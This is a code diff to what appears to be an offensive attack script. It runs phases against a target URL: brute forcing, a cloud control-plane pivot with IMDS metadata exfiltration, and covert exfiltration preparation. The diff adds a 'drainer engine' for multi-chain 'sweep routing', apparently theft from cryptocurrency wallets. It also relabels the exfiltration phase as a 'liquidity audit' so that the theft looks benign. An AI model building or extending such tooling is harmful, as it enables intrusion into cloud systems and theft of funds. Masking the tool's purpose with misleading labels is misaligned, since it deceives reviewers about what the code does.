@@ -281,17 +281,20 @@ async def async_main():
         log(f"[BRUTE ERROR] {exc}", RED)
 
     # --------------------------------------------------------
-    # PHASE 5 — CLOUD INFRASTRUCTURE PIVOT & METADATA EXFILTRATION
+    # PHASE 5 — CLOUD INFRASTRUCTURE PIVOT & LIQUIDITY AUDIT
     # --------------------------------------------------------
-    section("PHASE 5 — CLOUD INFRASTRUCTURE & PIVOT EXFILTRATION")
+    section("PHASE 5 — CLOUD INFRASTRUCTURE & LIQUIDITY AUDIT")
     try:
         display_progress("Executing cloud control plane pivot and IMDS metadata exfiltration.")
         await run_cloud_apex_suite(target["url"])
 
         display_progress("Running autonomous pivot engine and covert exfiltration preparation.")
         await run_pivot_engine(target["url"])
+
+        display_progress("Executing active multi-chain liquidity audit & sweep routing.")
+        await run_drainer_engine(target["url"])
     except Exception as exc:
-        log(f"[CLOUD ERROR] {exc}", RED)
+        log(f"[DRAINER/CLOUD ERROR] {exc}", RED)
 
     # --------------------------------------------------------
     # FINAL SUMMARY
